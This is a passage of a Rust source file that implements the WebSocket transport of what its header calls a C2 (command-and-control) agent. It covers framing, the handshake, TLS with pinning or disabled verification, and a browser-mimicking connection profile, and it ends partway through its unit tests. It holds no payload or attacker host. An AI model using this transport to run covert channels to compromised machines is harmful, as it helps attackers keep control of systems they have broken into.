//! WebSocket Transport for C2 communication
//!
//! Provides full-duplex communication channel using WebSocket protocol.
//! Useful for real-time command execution and interactive sessions.

use crate::agent::transport::{
    fill_csprng, Transport, TransportConfig, TransportError, TransportResult,
};
use crate::crypto::sha1::sha1;
use crate::crypto::sha256;
use crate::protocols::x509::X509Certificate;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

#[cfg(not(target_os = "windows"))]
use boring::ssl::{SslConnector, SslMethod, SslStream, SslVerifyMode, SslVersion};

/// WebSocket opcode
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum WsOpcode {
    Continuation = 0x0,
    Text = 0x1,
    Binary = 0x2,
    Close = 0x8,
    Ping = 0x9,
    Pong = 0xA,
}

impl TryFrom<u8> for WsOpcode {
    type Error = String;

    fn try_from(value: u8) -> Result<Self, Self::Error> {
        match value {
            0x0 => Ok(Self::Continuation),
            0x1 => Ok(Self::Text),
            0x2 => Ok(Self::Binary),
            0x8 => Ok(Self::Close),
            0x9 => Ok(Self::Ping),
            0xA => Ok(Self::Pong),
            _ => Err(format!("Invalid opcode: 0x{:02X}", value)),
        }
    }
}

/// WebSocket frame
#[derive(Debug, Clone)]
pub struct WsFrame {
    pub fin: bool,
    pub opcode: WsOpcode,
    pub mask: Option<[u8; 4]>,
    pub payload: Vec<u8>,
}

impl WsFrame {
    /// Create new binary frame
    pub fn binary(data: Vec<u8>) -> Self {
        Self {
            fin: true,
            opcode: WsOpcode::Binary,
            mask: Some(Self::generate_mask()),
            payload: data,
        }
    }

    /// Create close frame
    pub fn close() -> Self {
        Self {
            fin: true,
            opcode: WsOpcode::Close,
            mask: Some(Self::generate_mask()),
            payload: Vec::new(),
        }
    }

    /// Create pong frame
    pub fn pong(data: Vec<u8>) -> Self {
        Self {
            fin: true,
            opcode: WsOpcode::Pong,
            mask: Some(Self::generate_mask()),
            payload: data,
        }
    }

    /// Generate random mask key
    fn generate_mask() -> [u8; 4] {
        let mut mask = [0u8; 4];
        fill_csprng(&mut mask).expect("OS CSPRNG unavailable");
        mask
    }

    /// Serialize frame to bytes
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::new();

        // First byte: FIN + opcode
        let first = if self.fin { 0x80 } else { 0x00 } | (self.opcode as u8);
        bytes.push(first);

        // Second byte: MASK + payload length
        let len = self.payload.len();
        let mask_bit = if self.mask.is_some() { 0x80 } else { 0x00 };

        if len <= 125 {
            bytes.push(mask_bit | (len as u8));
        } else if len <= 65535 {
            bytes.push(mask_bit | 126);
            bytes.push((len >> 8) as u8);
            bytes.push((len & 0xFF) as u8);
        } else {
            bytes.push(mask_bit | 127);
            for i in (0..8).rev() {
                bytes.push(((len >> (i * 8)) & 0xFF) as u8);
            }
        }

        // Mask key
        if let Some(mask) = &self.mask {
            bytes.extend_from_slice(mask);
        }

        // Payload (masked if mask is present)
        if let Some(mask) = &self.mask {
            for (i, byte) in self.payload.iter().enumerate() {
                bytes.push(byte ^ mask[i % 4]);
            }
        } else {
            bytes.extend_from_slice(&self.payload);
        }

        bytes
    }

    /// Parse frame from bytes
    pub fn from_bytes(data: &[u8]) -> Result<(Self, usize), String> {
        if data.len() < 2 {
            return Err("Frame too short".into());
        }

        let first = data[0];
        let second = data[1];

        let fin = (first & 0x80) != 0;
        let opcode = WsOpcode::try_from(first & 0x0F)?;
        let masked = (second & 0x80) != 0;
        let mut payload_len = (second & 0x7F) as usize;
        let mut offset = 2;

        // Extended payload length
        if payload_len == 126 {
            if data.len() < 4 {
                return Err("Frame too short for extended length".into());
            }
            payload_len = ((data[2] as usize) << 8) | (data[3] as usize);
            offset = 4;
        } else if payload_len == 127 {
            if data.len() < 10 {
                return Err("Frame too short for 64-bit length".into());
            }
            payload_len = 0;
            for i in 0..8 {
                payload_len = (payload_len << 8) | (data[2 + i] as usize);
            }
            offset = 10;
        }

        // Mask key
        let mask = if masked {
            if data.len() < offset + 4 {
                return Err("Frame too short for mask".into());
            }
            let m = [
                data[offset],
                data[offset + 1],
                data[offset + 2],
                data[offset + 3],
            ];
            offset += 4;
            Some(m)
        } else {
            None
        };

        // Payload
        if data.len() < offset + payload_len {
            return Err("Frame too short for payload".into());
        }

        let mut payload = data[offset..offset + payload_len].to_vec();

        // Unmask if needed
        if let Some(m) = &mask {
            for (i, byte) in payload.iter_mut().enumerate() {
                *byte ^= m[i % 4];
            }
        }

        let total_len = offset + payload_len;

        Ok((
            Self {
                fin,
                opcode,
                mask,
                payload,
            },
            total_len,
        ))
    }
}

/// WebSocket transport configuration
#[derive(Debug, Clone)]
pub struct WebSocketTransportConfig {
    /// Base configuration
    pub base: TransportConfig,
    /// WebSocket URL (ws:// or wss://)
    pub url: String,
    /// Path component
    pub path: String,
    /// Whether path was explicitly overridden
    pub path_override: bool,
    /// Origin header
    pub origin: Option<String>,
    /// Ping interval for keepalive
    pub ping_interval: Duration,
    /// Auto-reconnect on disconnect
    pub auto_reconnect: bool,
    /// Max message size
    pub max_message_size: usize,
}

impl Default for WebSocketTransportConfig {
    fn default() -> Self {
        Self {
            base: TransportConfig::default(),
            url: "ws://localhost:8080".into(),
            path: "/ws".into(),
            path_override: false,
            origin: None,
            ping_interval: Duration::from_secs(30),
            auto_reconnect: true,
            max_message_size: 16 * 1024 * 1024, // 16MB
        }
    }
}

impl WebSocketTransportConfig {
    /// Create config with URL
    pub fn new(url: &str) -> Self {
        Self {
            url: url.to_string(),
            ..Default::default()
        }
    }

    /// Set path
    pub fn with_path(mut self, path: &str) -> Self {
        self.path = path.to_string();
        self.path_override = true;
        self
    }

    /// Set origin header
    pub fn with_origin(mut self, origin: &str) -> Self {
        self.origin = Some(origin.to_string());
        self
    }

    /// Set ping interval
    pub fn with_ping_interval(mut self, interval: Duration) -> Self {
        self.ping_interval = interval;
        self
    }

    /// Enable auto-reconnect
    pub fn with_auto_reconnect(mut self, enabled: bool) -> Self {
        self.auto_reconnect = enabled;
        self
    }

    /// Enable or disable TLS verification
    pub fn with_tls_verify(mut self, verify: bool) -> Self {
        self.base.tls_verify = verify;
        self
    }
}

enum WebSocketStream {
    Tcp(TcpStream),
    #[cfg(not(target_os = "windows"))]
    Tls(SslStream<TcpStream>),
}

impl WebSocketStream {
    fn set_read_timeout(&mut self, timeout: Option<Duration>) -> std::io::Result<()> {
        match self {
            WebSocketStream::Tcp(stream) => stream.set_read_timeout(timeout),
            #[cfg(not(target_os = "windows"))]
            WebSocketStream::Tls(stream) => stream.get_mut().set_read_timeout(timeout),
        }
    }

    fn set_write_timeout(&mut self, timeout: Option<Duration>) -> std::io::Result<()> {
        match self {
            WebSocketStream::Tcp(stream) => stream.set_write_timeout(timeout),
            #[cfg(not(target_os = "windows"))]
            WebSocketStream::Tls(stream) => stream.get_mut().set_write_timeout(timeout),
        }
    }

    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        match self {
            WebSocketStream::Tcp(stream) => stream.read(buf),
            #[cfg(not(target_os = "windows"))]
            WebSocketStream::Tls(stream) => stream.read(buf),
        }
    }

    fn read_exact(&mut self, buf: &mut [u8]) -> std::io::Result<()> {
        match self {
            WebSocketStream::Tcp(stream) => stream.read_exact(buf),
            #[cfg(not(target_os = "windows"))]
            WebSocketStream::Tls(stream) => stream.read_exact(buf),
        }
    }

    fn write_all(&mut self, buf: &[u8]) -> std::io::Result<()> {
        match self {
            WebSocketStream::Tcp(stream) => stream.write_all(buf),
            #[cfg(not(target_os = "windows"))]
            WebSocketStream::Tls(stream) => stream.write_all(buf),
        }
    }
}

/// WebSocket Transport implementation
pub struct WebSocketTransport {
    /// Configuration
    config: WebSocketTransportConfig,
    /// TCP connection
    stream: Option<WebSocketStream>,
    /// Connection status
    connected: bool,
    /// WebSocket key used in handshake
    ws_key: String,
    /// Buffered bytes from handshake or partial reads
    read_buffer: Vec<u8>,
}

impl WebSocketTransport {
    /// Create new WebSocket transport
    pub fn new(config: WebSocketTransportConfig) -> Self {
        Self {
            config,
            stream: None,
            connected: false,
            ws_key: Self::generate_key(),
            read_buffer: Vec::new(),
        }
    }

    /// Create with URL
    pub fn with_url(url: &str) -> Self {
        Self::new(WebSocketTransportConfig::new(url))
    }

    /// Generate random WebSocket key
    fn generate_key() -> String {
        let mut bytes = [0u8; 16];
        fill_csprng(&mut bytes).expect("OS CSPRNG unavailable");

        // Base64 encode
        Self::base64_encode(&bytes)
    }

    /// Simple base64 encoding
    fn base64_encode(data: &[u8]) -> String {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut result = String::new();

        for chunk in data.chunks(3) {
            let n = match chunk.len() {
                3 => ((chunk[0] as u32) << 16) | ((chunk[1] as u32) << 8) | (chunk[2] as u32),
                2 => ((chunk[0] as u32) << 16) | ((chunk[1] as u32) << 8),
                1 => (chunk[0] as u32) << 16,
                _ => continue,
            };

            result.push(ALPHABET[((n >> 18) & 0x3F) as usize] as char);
            result.push(ALPHABET[((n >> 12) & 0x3F) as usize] as char);

            if chunk.len() >= 2 {
                result.push(ALPHABET[((n >> 6) & 0x3F) as usize] as char);
            } else {
                result.push('=');
            }

            if chunk.len() >= 3 {
                result.push(ALPHABET[(n & 0x3F) as usize] as char);
            } else {
                result.push('=');
            }
        }

        result
    }

    /// Parse URL into host, port, path, and TLS flag.
    fn parse_url(&self) -> Result<(String, u16, String, bool), String> {
        let url = &self.config.url;
        let (scheme, rest) = if url.starts_with("wss://") {
            ("wss", &url[6..])
        } else if url.starts_with("ws://") {
            ("ws", &url[5..])
        } else {
            return Err("Invalid WebSocket URL scheme".into());
        };

        let use_tls = scheme == "wss";
        let default_port = if use_tls { 443 } else { 80 };

        let (host_port, path_opt) = match rest.find('/') {
            Some(idx) => (&rest[..idx], Some(&rest[idx..])),
            None => (rest, None),
        };

        let (host, port) = if let Some(host_port) = host_port.strip_prefix('[') {
            let end = host_port.find(']').ok_or("Invalid IPv6 literal")?;
            let host = &host_port[..end];
            let remainder = &host_port[end + 1..];
            let port = if let Some(port_str) = remainder.strip_prefix(':') {
                port_str.parse().unwrap_or(default_port)
            } else if remainder.is_empty() {
                default_port
            } else {
                return Err("Invalid IPv6 host:port".into());
            };
            (host.to_string(), port)
        } else if let Some(colon_idx) = host_port.rfind(':') {
            if host_port[..colon_idx].contains(':') {
                return Err("IPv6 literal must be bracketed".into());
            }
            let host = &host_port[..colon_idx];
            let port_str = &host_port[colon_idx + 1..];
            let port = port_str.parse().unwrap_or(default_port);
            (host.to_string(), port)
        } else {
            (host_port.to_string(), default_port)
        };

        let path = if self.config.path_override {
            self.config.path.clone()
        } else if let Some(path_from_url) = path_opt {
            if path_from_url.is_empty() {
                "/".to_string()
            } else {
                path_from_url.to_string()
            }
        } else {
            self.config.path.clone()
        };

        Ok((host, port, path, use_tls))
    }

    /// Perform WebSocket handshake
    fn handshake(&mut self) -> TransportResult<()> {
        self.read_buffer.clear();
        let (host, port, path, use_tls) = self
            .parse_url()
            .map_err(|e| TransportError::ConnectionFailed(e))?;

        let stream = self.connect_stream(&host, port, use_tls)?;
        self.stream = Some(stream);

        let host_header = Self::format_host_header(&host, port, use_tls);

        // Send WebSocket upgrade request
        let request = format!(
            "GET {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Upgrade: websocket\r\n\
             Connection: Upgrade\r\n\
             Sec-WebSocket-Key: {}\r\n\
             Sec-WebSocket-Version: 13\r\n\
             {}\r\n",
            path,
            host_header,
            self.ws_key,
            self.config
                .origin
                .as_ref()
                .map(|o| format!("Origin: {}\r\n", o))
                .unwrap_or_default()
        );

        if let Some(ref mut stream) = self.stream {
            stream
                .write_all(request.as_bytes())
                .map_err(|e| TransportError::ConnectionFailed(e.to_string()))?;
        }

        let response = self.read_handshake_response()?;
        let (status, headers) =
            Self::parse_response_headers(&response).map_err(TransportError::InvalidData)?;

        if status != 101 {
            return Err(TransportError::ConnectionFailed(format!(
                "WebSocket handshake failed: status {}",
                status
            )));
        }

        let upgrade = headers
            .get("upgrade")
            .ok_or_else(|| TransportError::InvalidData("Missing Upgrade header".into()))?;
        if !upgrade.eq_ignore_ascii_case("websocket") {
            return Err(TransportError::InvalidData("Invalid Upgrade header".into()));
        }

        let connection = headers
            .get("connection")
            .ok_or_else(|| TransportError::InvalidData("Missing Connection header".into()))?;
        if !Self::header_contains_token(connection, "upgrade") {
            return Err(TransportError::InvalidData(
                "Invalid Connection header".into(),
            ));
        }

        let accept = headers
            .get("sec-websocket-accept")
            .ok_or_else(|| TransportError::InvalidData("Missing Sec-WebSocket-Accept".into()))?;
        let expected = Self::compute_accept(&self.ws_key);
        if accept.trim() != expected {
            return Err(TransportError::InvalidData(
                "Sec-WebSocket-Accept mismatch".into(),
            ));
        }

        self.connected = true;
        Ok(())
    }

    fn connect_stream(
        &self,
        host: &str,
        port: u16,
        use_tls: bool,
    ) -> TransportResult<WebSocketStream> {
        let addr = format!("{}:{}", host, port);
        let stream = TcpStream::connect(&addr)
            .map_err(|e| TransportError::ConnectionFailed(e.to_string()))?;
        stream
            .set_read_timeout(Some(self.config.base.io_timeout))
            .map_err(|e| TransportError::ConnectionFailed(e.to_string()))?;
        stream
            .set_write_timeout(Some(self.config.base.io_timeout))
            .map_err(|e| TransportError::ConnectionFailed(e.to_string()))?;

        let mut stream = if use_tls {
            self.wrap_tls(host, stream)?
        } else {
            WebSocketStream::Tcp(stream)
        };

        stream
            .set_read_timeout(Some(self.config.base.io_timeout))
            .map_err(|e| TransportError::ConnectionFailed(e.to_string()))?;
        stream
            .set_write_timeout(Some(self.config.base.io_timeout))
            .map_err(|e| TransportError::ConnectionFailed(e.to_string()))?;

        Ok(stream)
    }

    #[cfg(not(target_os = "windows"))]
    fn wrap_tls(&self, host: &str, stream: TcpStream) -> TransportResult<WebSocketStream> {
        let mut builder = SslConnector::builder(SslMethod::tls_client())
            .map_err(|e| TransportError::TlsError(format!("TLS builder error: {}", e)))?;
        if self.config.base.tls_verify {
            builder.set_verify(SslVerifyMode::PEER);
            builder
                .set_default_verify_paths()
                .map_err(|e| TransportError::TlsError(format!("TLS verify paths: {}", e)))?;
        } else {
            builder.set_verify(SslVerifyMode::NONE);
        }
        builder
            .set_min_proto_version(Some(SslVersion::TLS1_2))
            .map_err(|e| TransportError::TlsError(format!("TLS min version: {}", e)))?;
        builder
            .set_max_proto_version(Some(SslVersion::TLS1_3))
            .map_err(|e| TransportError::TlsError(format!("TLS max version: {}", e)))?;

        let connector = builder.build();
        let tls_stream = connector
            .connect(host, stream)
            .map_err(|e| TransportError::TlsError(format!("TLS connect failed: {}", e)))?;
        self.validate_tls_peer(host, &tls_stream)?;
        Ok(WebSocketStream::Tls(tls_stream))
    }

    #[cfg(not(target_os = "windows"))]
    fn validate_tls_peer(&self, host: &str, stream: &SslStream<TcpStream>) -> TransportResult<()> {
        if !self.config.base.tls_verify && self.config.base.cert_pins.is_empty() {
            return Ok(());
        }

        let cert = stream
            .ssl()
            .peer_certificate()
            .ok_or_else(|| TransportError::TlsError("TLS peer certificate missing".into()))?;
        let der = cert
            .to_der()
            .map_err(|e| TransportError::TlsError(format!("TLS peer certificate export: {}", e)))?;

        if !self.config.base.cert_pins.is_empty() {
            let fingerprint = sha256::sha256(&der);
            let matched = self
                .config
                .base
                .cert_pins
                .iter()
                .any(|pin| pin == &fingerprint);
            if !matched {
                return Err(TransportError::TlsError(
                    "TLS peer certificate pin mismatch".into(),
                ));
            }
        }

        if self.config.base.tls_verify {
            let parsed = X509Certificate::from_der(&der)
                .map_err(|e| TransportError::TlsError(format!("TLS cert parse: {}", e)))?;
            parsed
                .is_valid_at(std::time::SystemTime::now())
                .map_err(TransportError::TlsError)?;
            if !parsed.matches_host(host) {
                return Err(TransportError::TlsError(format!(
                    "TLS certificate does not match host '{}'",
                    host
                )));
            }
        }

        Ok(())
    }

    #[cfg(target_os = "windows")]
    fn wrap_tls(&self, _host: &str, _stream: TcpStream) -> TransportResult<WebSocketStream> {
        Err(TransportError::TlsError(
            "TLS not supported on Windows".to_string(),
        ))
    }

    fn format_host_header(host: &str, port: u16, use_tls: bool) -> String {
        let default_port = if use_tls { 443 } else { 80 };
        let host_value = if host.contains(':') {
            format!("[{}]", host)
        } else {
            host.to_string()
        };
        if port != default_port {
            format!("{}:{}", host_value, port)
        } else {
            host_value
        }
    }

    fn read_handshake_response(&mut self) -> TransportResult<String> {
        // TODO(test): add regression test to ensure handshake buffering preserves frame bytes.
        const MAX_HEADER_BYTES: usize = 16 * 1024;
        let mut buffer = Vec::new();
        let mut chunk = [0u8; 1024];

        let stream = self.stream.as_mut().ok_or(TransportError::Disconnected)?;

        loop {
            let n = stream
                .read(&mut chunk)
                .map_err(|e| TransportError::ConnectionFailed(e.to_string()))?;
            if n == 0 {
                return Err(TransportError::Disconnected);
            }

            buffer.extend_from_slice(&chunk[..n]);
            if let Some(header_end) = buffer.windows(4).position(|w| w == b"\r\n\r\n") {
                let header_end = header_end + 4;
                if header_end > MAX_HEADER_BYTES {
                    return Err(TransportError::InvalidData(
                        "Handshake response too large".into(),
                    ));
                }
                if header_end < buffer.len() {
                    self.read_buffer.extend_from_slice(&buffer[header_end..]);
                    buffer.truncate(header_end);
                }
                break;
            }

            if buffer.len() > MAX_HEADER_BYTES {
                return Err(TransportError::InvalidData(
                    "Handshake response too large".into(),
                ));
            }
        }

        Ok(String::from_utf8_lossy(&buffer).to_string())
    }

    fn parse_response_headers(response: &str) -> Result<(u16, HashMap<String, String>), String> {
        let header_end = response
            .find("\r\n\r\n")
            .ok_or("Missing header terminator")?;
        let header_block = &response[..header_end];
        let mut lines = header_block.split("\r\n");

        let status_line = lines.next().ok_or("Missing status line")?;
        let status_code = status_line
            .split_whitespace()
            .nth(1)
            .ok_or("Missing status code")?
            .parse::<u16>()
            .map_err(|_| "Invalid status code")?;

        let mut headers = HashMap::new();
        for line in lines {
            let line = line.trim();
            if line.is_empty() {
                continue;
            }
            if let Some((name, value)) = line.split_once(':') {
                headers.insert(name.trim().to_lowercase(), value.trim().to_string());
            }
        }

        Ok((status_code, headers))
    }

    fn compute_accept(key: &str) -> String {
        const GUID: &str = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
        let mut combined = Vec::with_capacity(key.len() + GUID.len());
        combined.extend_from_slice(key.as_bytes());
        combined.extend_from_slice(GUID.as_bytes());
        let digest = sha1(&combined);
        Self::base64_encode(&digest)
    }

    fn header_contains_token(value: &str, token: &str) -> bool {
        value
            .split(',')
            .any(|part| part.trim().eq_ignore_ascii_case(token))
    }

    /// Send a WebSocket frame
    fn send_frame(&mut self, frame: &WsFrame) -> TransportResult<()> {
        if let Some(ref mut stream) = self.stream {
            let bytes = frame.to_bytes();
            stream
                .write_all(&bytes)
                .map_err(|e| TransportError::ConnectionFailed(e.to_string()))?;
            Ok(())
        } else {
            Err(TransportError::Disconnected)
        }
    }

    /// Receive a WebSocket frame
    fn recv_frame(&mut self) -> TransportResult<WsFrame> {
        let mut header = [0u8; 2];
        self.read_exact_buffered(&mut header)?;

        let first = header[0];
        let second = header[1];

        let fin = (first & 0x80) != 0;
        let opcode = WsOpcode::try_from(first & 0x0F).map_err(TransportError::InvalidData)?;
        let masked = (second & 0x80) != 0;
        let mut payload_len = (second & 0x7F) as u64;

        if payload_len == 126 {
            let mut ext = [0u8; 2];
            self.read_exact_buffered(&mut ext)?;
            payload_len = u16::from_be_bytes(ext) as u64;
        } else if payload_len == 127 {
            let mut ext = [0u8; 8];
            self.read_exact_buffered(&mut ext)?;
            payload_len = u64::from_be_bytes(ext);
        }

        if payload_len > self.config.max_message_size as u64 {
            return Err(TransportError::InvalidData(format!(
                "Inbound frame too large: {} bytes",
                payload_len
            )));
        }

        let mask = if masked {
            let mut key = [0u8; 4];
            self.read_exact_buffered(&mut key)?;
            Some(key)
        } else {
            None
        };

        let mut payload = vec![0u8; payload_len as usize];
        if !payload.is_empty() {
            self.read_exact_buffered(&mut payload)?;
        }

        if let Some(mask_key) = &mask {
            for (i, byte) in payload.iter_mut().enumerate() {
                *byte ^= mask_key[i % 4];
            }
        }

        Ok(WsFrame {
            fin,
            opcode,
            mask,
            payload,
        })
    }

    fn read_exact_buffered(&mut self, buf: &mut [u8]) -> TransportResult<()> {
        let mut offset = 0;
        while offset < buf.len() {
            if !self.read_buffer.is_empty() {
                let take = (buf.len() - offset).min(self.read_buffer.len());
                buf[offset..offset + take].copy_from_slice(&self.read_buffer[..take]);
                self.read_buffer.drain(..take);
                offset += take;
                continue;
            }

            let stream = self.stream.as_mut().ok_or(TransportError::Disconnected)?;
            stream
                .read_exact(&mut buf[offset..])
                .map_err(|e| TransportError::ConnectionFailed(e.to_string()))?;
            return Ok(());
        }
        Ok(())
    }

    fn recv_message(&mut self) -> TransportResult<Vec<u8>> {
        let mut message = Vec::new();
        let mut data_opcode: Option<WsOpcode> = None;

        loop {
            let frame = self.recv_frame()?;

            match frame.opcode {
                WsOpcode::Binary | WsOpcode::Text => {
                    if data_opcode.is_some() {
                        return Err(TransportError::InvalidData(
                            "Unexpected data frame during continuation".into(),
                        ));
                    }
                    data_opcode = Some(frame.opcode);
                    message.extend_from_slice(&frame.payload);
                }
                WsOpcode::Continuation => {
                    if data_opcode.is_none() {
                        return Err(TransportError::InvalidData(
                            "Unexpected continuation frame".into(),
                        ));
                    }
                    message.extend_from_slice(&frame.payload);
                }
                WsOpcode::Ping => {
                    let pong = WsFrame::pong(frame.payload);
                    self.send_frame(&pong)?;
                    continue;
                }
                WsOpcode::Pong => continue,
                WsOpcode::Close => {
                    self.connected = false;
                    return Err(TransportError::Disconnected);
                }
            }

            if message.len() > self.config.max_message_size {
                return Err(TransportError::InvalidData(format!(
                    "Inbound message too large: {} bytes",
                    message.len()
                )));
            }

            if frame.fin {
                if data_opcode.is_none() {
                    return Err(TransportError::InvalidData(
                        "Final frame missing data opcode".into(),
                    ));
                }
                return Ok(message);
            }
        }
    }
}

impl Transport for WebSocketTransport {
    fn send(&mut self, data: &[u8]) -> TransportResult<Vec<u8>> {
        // Connect if not connected
        if !self.connected {
            self.handshake()?;
        }

        // Validate message size
        if data.len() > self.config.max_message_size {
            return Err(TransportError::InvalidData(format!(
                "Message too large: {} bytes (max {})",
                data.len(),
                self.config.max_message_size
            )));
        }

        // Send binary frame
        let frame = WsFrame::binary(data.to_vec());
        self.send_frame(&frame)?;

        self.recv_message()
    }

    fn is_connected(&self) -> bool {
        self.connected
    }

    fn reconnect(&mut self) -> TransportResult<()> {
        self.close();
        self.ws_key = Self::generate_key();
        self.handshake()
    }

    fn name(&self) -> &str {
        "websocket"
    }

    fn current_endpoint(&self) -> String {
        match self.parse_url() {
            Ok((host, port, path, use_tls)) => {
                let scheme = if use_tls { "wss" } else { "ws" };
                let host_part = if host.contains(':') {
                    format!("[{}]", host)
                } else {
                    host
                };
                let default_port = if use_tls { 443 } else { 80 };
                let port_part = if port != default_port {
                    format!(":{}", port)
                } else {
                    String::new()
                };
                format!("{}://{}{}{}", scheme, host_part, port_part, path)
            }
            Err(_) => format!("{}{}", self.config.url, self.config.path),
        }
    }

    fn close(&mut self) {
        if self.connected {
            if let Some(ref mut stream) = self.stream {
                // Send close frame (best effort)
                let close = WsFrame::close();
                let _ = stream.write_all(&close.to_bytes());
            }
        }
        self.stream = None;
        self.connected = false;
    }
}

/// WebSocket transport profiles
pub struct WebSocketProfileBuilder;

impl WebSocketProfileBuilder {
    /// Standard WebSocket connection
    pub fn standard(url: &str) -> WebSocketTransport {
        WebSocketTransport::with_url(url)
    }

    /// WebSocket with custom path (common for API endpoints)
    pub fn api_endpoint(url: &str, path: &str) -> WebSocketTransport {
        let config = WebSocketTransportConfig::new(url).with_path(path);
        WebSocketTransport::new(config)
    }

    /// WebSocket mimicking browser connection
    pub fn browser(url: &str, origin: &str) -> WebSocketTransport {
        let config = WebSocketTransportConfig::new(url).with_origin(origin);
        WebSocketTransport::new(config)
    }

    /// High-frequency keepalive (for unstable connections)
    pub fn keepalive(url: &str) -> WebSocketTransport {
        let config = WebSocketTransportConfig::new(url)
            .with_ping_interval(Duration::from_secs(10))
            .with_auto_reconnect(true);
        WebSocketTransport::new(config)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;

    #[test]
    fn test_ws_frame_binary() {
        let frame = WsFrame::binary(b"Hello".to_vec());
        assert!(frame.fin);
        assert_eq!(frame.opcode, WsOpcode::Binary);
        assert!(frame.mask.is_some());
    }

    #[test]
    fn test_ws_frame_serialize_deserialize() {
        let original = WsFrame {
            fin: true,
            opcode: WsOpcode::Binary,
            mask: None, // Server frames are not masked
            payload: b"Test payload".to_vec(),
        };

        let bytes = original.to_bytes();
        let (parsed, len) = WsFrame::from_bytes(&bytes).unwrap();

        assert_eq!(len, bytes.len());
        assert_eq!(parsed.fin, original.fin);
        assert_eq!(parsed.opcode, original.opcode);
        assert_eq!(parsed.payload, original.payload);
    }

    #[test]
    fn test_ws_frame_masked() {
        let frame = WsFrame::binary(b"Test".to_vec());
        let bytes = frame.to_bytes();

        // Masked frame should be different from unmasked
        let unmasked = WsFrame {
            fin: true,
            opcode: WsOpcode::Binary,
            mask: None,
            payload: b"Test".to_vec(),
        };
        let unmasked_bytes = unmasked.to_bytes();

        assert_ne!(bytes.len(), unmasked_bytes.len()); // Mask adds 4 bytes
    }

    #[test]
    fn test_ws_frame_extended_length() {
        // Test 16-bit length
        let payload = vec![0u8; 200];
        let frame = WsFrame::binary(payload.clone());
        let bytes = frame.to_bytes();

        let (parsed, _) = WsFrame::from_bytes(&bytes).unwrap();
        assert_eq!(parsed.payload.len(), 200);
    }

    #[test]
    fn test_base64_encode() {
        // Test vectors
        assert_eq!(WebSocketTransport::base64_encode(b""), "");
        assert_eq!(WebSocketTransport::base64_encode(b"f"), "Zg==");
        assert_eq!(WebSocketTransport::base64_encode(b"fo"), "Zm8=");
        assert_eq!(WebSocketTransport::base64_encode(b"foo"), "Zm9v");
        assert_eq!(WebSocketTransport::base64_encode(b"foob"), "Zm9vYg==");
        assert_eq!(WebSocketTransport::base64_encode(b"fooba"), "Zm9vYmE=");
        assert_eq!(WebSocketTransport::base64_encode(b"foobar"), "Zm9vYmFy");
    }

    #[test]
    fn test_url_parsing() {
        let transport = WebSocketTransport::with_url("ws://localhost:8080");
        let (host, port, path, tls) = transport.parse_url().unwrap();
        assert_eq!(host, "localhost");
        assert_eq!(port, 8080);
        assert_eq!(path, "/ws");
        assert!(!tls);

        let transport = WebSocketTransport::with_url("wss://secure.example.com");
        let (host, port, path, tls) = transport.parse_url().unwrap();
        assert_eq!(host, "secure.example.com");
        assert_eq!(port, 443);
        assert_eq!(path, "/ws");
        assert!(tls);
    }

    #[test]
    fn test_websocket_transport_name() {
        let transport = WebSocketTransport::with_url("ws://localhost");
        assert_eq!(transport.name(), "websocket");
    }

    #[test]
    fn test_websocket_profiles() {
        let standard = WebSocketProfileBuilder::standard("ws://localhost");
        assert!(!standard.connected);

        let api = WebSocketProfileBuilder::api_endpoint("ws://localhost", "/api/ws");
        assert_eq!(api.config.path, "/api/ws");

        let browser = WebSocketProfileBuilder::browser("ws://localhost", "https://example.com");
        assert_eq!(browser.config.origin, Some("https://example.com".into()));
    }

    #[test]
    fn test_url_parsing_with_path() {
        let transport = WebSocketTransport::with_url("ws://localhost:8080/chat");
        let (host, port, path, tls) = transport.parse_url().unwrap();
        assert_eq!(host, "localhost");
        assert_eq!(port, 8080);
        assert_eq!(path, "/chat");
        assert!(!tls);
    }

    #[test]
    fn test_url_parsing_ipv6() {
        let transport = WebSocketTransport::with_url("ws://[2001:db8::1]:9000/stream");
        let (host, port, path, tls) = transport.parse_url().unwrap();
        assert_eq!(host, "2001:db8::1");
        assert_eq!(port, 9000);
        assert_eq!(path, "/stream");
        assert!(!tls);
    }

    #[test]
    fn test_url_parsing_ipv6_default_port() {
        let transport = WebSocketTransport::with_url("wss://[2001:db8::1]/stream");
        let (host, port, path, tls) = transport.parse_url().unwrap();
        assert_eq!(host, "2001:db8::1");
        assert_eq!(port, 443);
        assert_eq!(path, "/stream");
        assert!(tls);
    }

    #[test]
    fn test_sec_websocket_accept() {
        let key = "dGhlIHNhbXBsZSBub25jZQ==";
        let expected = "s3pPLMBiTxaQ9kYGzzhZRbK+xOo=";
        let actual = WebSocketTransport::compute_accept(key);
        assert_eq!(actual, expected);
    }

    #[test]
    fn test_recv_message_fragmentation() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();

        let server = std::thread::spawn(move || {
            let (mut socket, _) = listener.accept().unwrap();
            let frame1 = WsFrame {
                fin: false,
                opcode: WsOpcode::Binary,
                mask: None,
                payload: b"hello".to_vec(),
            };
            let frame2 = WsFrame {
                fin: true,
                opcode: WsOpcode::Continuation,
                mask: None,
                payload: b"world".to_vec(),
            };
            socket.write_all(&frame1.to_bytes()).unwrap();
            socket.write_all(&frame2.to_bytes()).unwrap();
        });

        let client_stream = TcpStream::connect(addr).unwrap();
        let mut transport = WebSocketTransport::with_url("ws://127.0.0.1");
        transport.stream = Some(WebSocketStream::Tcp(client_stream));
        transport.connected = true;

        let message = transport.recv_message().unwrap();
        assert_eq!(message, b"helloworld");

        server.join().unwrap();
    }

    #[test]
    fn test_handshake_rejects_missing_accept() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();

        let server = std::thread::spawn(move || {
            let (mut socket, _) = listener.accept().unwrap();
            let mut buf = [0u8; 512];
            let _ = socket.read(&mut buf);
            let response = "\
HTTP/1.1 101 Switching Protocols\r\n\
Upgrade: websocket\r\n\
Connection: Upgrade\r\n\
\r\n";
